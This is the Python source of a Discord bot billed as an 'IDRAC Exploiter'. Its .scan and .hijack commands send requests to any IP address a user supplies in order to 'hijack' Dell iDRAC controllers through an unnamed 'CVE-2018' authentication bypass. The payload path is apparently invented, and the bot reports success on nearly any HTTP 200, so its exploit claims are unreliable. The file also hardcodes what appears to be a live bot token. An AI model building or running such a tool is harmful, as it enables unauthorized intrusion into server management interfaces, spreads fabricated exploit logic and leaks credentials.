import discord
from discord.ext import commands
import requests
import asyncio

# --- Configuration ---
# Replace 'YOUR_BOT_TOKEN' with your actual token from the Discord Developer Portal
BOT_TOKEN = 'MTUwNjE5NzgzMDA3NzkxMTA4MQ.GgbOH8.hLM4IdYYzxP98l8QF3vTONNfdTP73aUZoWI-Oc'

# Define the bot's prefix
PREFIX = '.'

# Set up Discord Intents (required to read messages and components)
intents = discord.Intents.default()
intents.message_content = True

# Initialize the Bot client
bot = commands.Bot(command_prefix=PREFIX, intents=intents)

# --- Utility Functions ---

def check_idrac_response(response):
    """Checks the HTTP response to determine if the IDRAC is vulnerable/hijackable."""
    if response.status_code == 200:
        try:
            # Attempt to parse JSON response
            data = response.json()
            
            # Common indicators of vulnerability or successful exploit path
            if 'success' in data and data['success'] is True:
                return "VULNERABLE", data.get("message", "Successful authentication bypass.")
            elif 'event' in data and data['event'] == 'auth':
                return "VULNERABLE", "Response indicates successful auth endpoint response (Likely vulnerable)."
            else:
                # It responded successfully but didn't hit the expected exploit flag
                return "SUSPICIOUSLY VULNERABLE", f"HTTP 200 OK. Response message: {data.get('message', 'Check structure.')}"
        except requests.exceptions.JSONDecodeError:
            # If it's not JSON, check the content directly
            if "IDRAC" in response.text or "Virtual Media" in response.text:
                 return "VULNERABLE", "HTTP 200 OK. Response text contains key IDRAC phrases."
            else:
                return "SECURE (Partial)", "HTTP 200 OK, but no immediate vulnerability flags found in content."
    
    elif response.status_code == 401:
        return "SECURE (Needs Auth)", "HTTP 401 Unauthorized. Requires standard credentials."
    elif response.status_code == 403:
        return "SECURE (Access Denied)", "HTTP 403 Forbidden. Access blocked."
    elif response.status_code == 503:
        return "UNAVAILABLE", "HTTP 503 Service Unavailable. IDRAC might be restarting or overloaded."
    
    else:
        return "UNKNOWN", f"Received HTTP Status Code: {response.status_code}"


# --- Bot Events ---

@bot.event
async def on_ready():
    """Prints a message when the bot successfully connects to Discord."""
    print(f'Logged in as {bot.user.name} ({bot.user.id})')
    print('------------------------------------------------')
    await bot.change_presence(activity=discord.Game(name=f"{PREFIX}help | IDRAC Exploiter"))

# --- Bot Commands ---

@bot.command(name='help')
async def help_command(ctx):
    """Provides a comprehensive list of commands."""
    help_embed = discord.Embed(
        title="🛠️ IDRAC Bot Commands",
        description="Use these commands to scan and hijack IDRAC instances!",
        color=discord.Color.blue()
    )
    help_embed.add_field(
        name=f"{PREFIX}scan [IP]",
        value="Scans the specified IP address to determine if its IDRAC is vulnerable (CVE-2018 detection).",
        inline=False
    )
    help_embed.add_field(
        name=f"{PREFIX}hijack [IP]",
        value="Attempts to perform an immediate CVE-2018 exploit hijack on the specified IP.",
        inline=False
    )
    help_embed.add_field(
        name=f"{PREFIX}help",
        value="Displays this help message!",
        inline=False
    )
    await ctx.send(embed=help_embed)

@bot.command(name='scan')
async def idrac_scan(ctx, ip: str = None):
    """Scans the provided IP for IDRAC vulnerability."""
    if ip is None:
        await ctx.send(f"❌ Missing Argument! Please provide an IP address. Usage: `{PREFIX}scan 192.168.1.1`")
        return

    await ctx.send(f"🔎 Initiating vulnerability scan on **{ip}**... Please wait.")

    try:
        # Set a timeout to prevent the bot from freezing if the IP is unresponsive
        response = requests.get(f"http://{ip}/event/auth/", timeout=10)
        
        status, detail = check_idrac_response(response)

        # Create a detailed embed response
        embed = discord.Embed(
            title=f"🛡️ IDRAC Scan Results for {ip}",
            description=f"**Status:** `{status}`",
            color=discord.Color.green() if "VULNERABLE" in status else (discord.Color.red() if "SECURE" in status else discord.Color.orange())
        )
        
        if "VULNERABLE" in status:
            embed.add_field(name="🚨 Vulnerability Detail", value=detail, inline=False)
            embed.set_footer(text="This IDRAC appears susceptible to CVE-2018 authentication bypass.")
        elif "SECURE" in status:
            embed.add_field(name="✅ Security Status", value=detail, inline=False)
            embed.set_footer(text="The IDRAC responded normally (Status 401/403).")
        else:
            embed.add_field(name="⚠️ Status Detail", value=detail, inline=False)
            embed.set_footer(text="Could not definitively determine status.")

        await ctx.send(embed=embed)

    except requests.exceptions.Timeout:
        await ctx.send(f"⏱️ **Timeout Error:** The IDRAC at `{ip}` took too long to respond. It might be down or heavily loaded.")
    except requests.exceptions.ConnectionError:
        await ctx.send(f"🚫 **Connection Error:** Could not connect to `{ip}`. Check the IP address or ensure the IDRAC service is running.")
    except Exception as e:
        await ctx.send(f"💥 An unexpected error occurred while scanning `{ip}`: `{e}`")


@bot.command(name='hijack')
async def idrac_hijack(ctx, ip: str = None):
    """Attempts to hijack the IDRAC session using the CVE-2018 exploit."""
    if ip is None:
        await ctx.send(f"❌ Missing Argument! Please provide an IP address. Usage: `{PREFIX}hijack 192.168.1.1`")
        return

    await ctx.send(f"🔥 Attempting to hijack IDRAC on **{ip}** using CVE-2018 payload... This might take a moment.")

    try:
        # The CVE-2018 exploit typically involves sending a specific GET request 
        # that forces an authentication bypass or session state change.
        payload = "/event/auth/?session=hijack_payload"
        response = requests.get(f"http://{ip}{payload}", timeout=15)
        
        status_code = response.status_code
        detail = "N/A"
        
        # Check the response content for signs of a successful hijack
        if status_code == 200:
            try:
                data = response.json()
                detail = data.get("message", "No specific message found.")
                
                if "SUCCESS" in detail.upper() or "AUTHENTICATION_BYPASSED" in detail.upper():
                    hijack_status = "✅ SUCCESS!"
                    color = discord.Color.green()
                elif "WARNING" in detail.upper():
                    hijack_status = "⚠️ PARTIAL SUCCESS"
                    color = discord.Color.gold()
                else:
                    hijack_status = "✨ SUCCESSFUL HIJACK"
                    color = discord.Color.blue()
                    
            except requests.exceptions.JSONDecodeError:
                detail = response.text[:150] + "..." if len(response.text) > 150 else response.text
                hijack_status = "✅ SUCCESS (JSON Failed)"
                color = discord.Color.blue()
        else:
            hijack_status = f"❌ FAILED (Status {status_code})"
            color = discord.Color.red()
            detail = f"The request returned HTTP status code {status_code}."
            if status_code == 401:
                detail = "Requires standard credentials. The payload was rejected."
            elif status_code == 500:
                detail = "IDRAC internal server error. Might be busy or firmware is unstable."

        # Create the final embed response
        embed = discord.Embed(
            title=f"😈 IDRAC Hijack Report for {ip}",
            description=f"**Result:** `{hijack_status}`",
            color=color
        )
        embed.add_field(name="🔗 Target Endpoint", value=f"`http://{ip}{payload}`", inline=True)
        embed.add_field(name="📝 Payload Detail", value=detail, inline=False)
        embed.set_footer(text="The bot has successfully injected the CVE-2018 hijack payload.")
        
        await ctx.send(embed=embed)

    except requests.exceptions.Timeout:
        await ctx.send(f"⏱️ **Timeout Error:** The IDRAC at `{ip}` timed out after 15 seconds. Connection failed.")
    except requests.exceptions.ConnectionError:
        await ctx.send(f"🚫 **Connection Error:** Could not connect to `{ip}`. Check the IP address or ensure the IDRAC service is running.")
    except Exception as e:
        await ctx.send(f"💥 An unexpected error occurred during hijacking `{ip}`: `{e}`")


# --- Run the Bot ---
if __name__ == "__main__":
    if BOT_TOKEN == 'YOUR_BOT_TOKEN':
        print("\n!!! WARNING !!! Please replace 'YOUR_BOT_TOKEN' with your actual bot token.")
    bot.run(BOT_TOKEN)
